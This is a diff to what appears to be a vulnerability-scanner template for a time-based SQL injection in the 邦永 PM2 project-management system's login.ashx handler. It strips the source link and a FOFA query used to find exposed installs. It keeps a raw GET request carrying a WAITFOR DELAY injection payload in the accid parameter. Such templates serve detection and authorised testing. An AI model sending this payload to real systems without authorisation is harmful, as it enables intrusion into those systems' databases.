@@ -3,12 +3,8 @@ info:
   name: 邦永PM2 login.ashx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yo68z4cgn3ewwrbd'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yo68z4cgn3ewwrbd
-    fofa: body="PM2项目管理系统BS版增强工具.zip" || body="PM2项目管理平台"
 http:
 - raw:
   - 'GET /handler/login.ashx?n=0.7674954297434442&accid=1001''%20WAITFOR%20DELAY%20''0:0:5''--&loginCode=321&loginPwd=123 HTTP/1.1
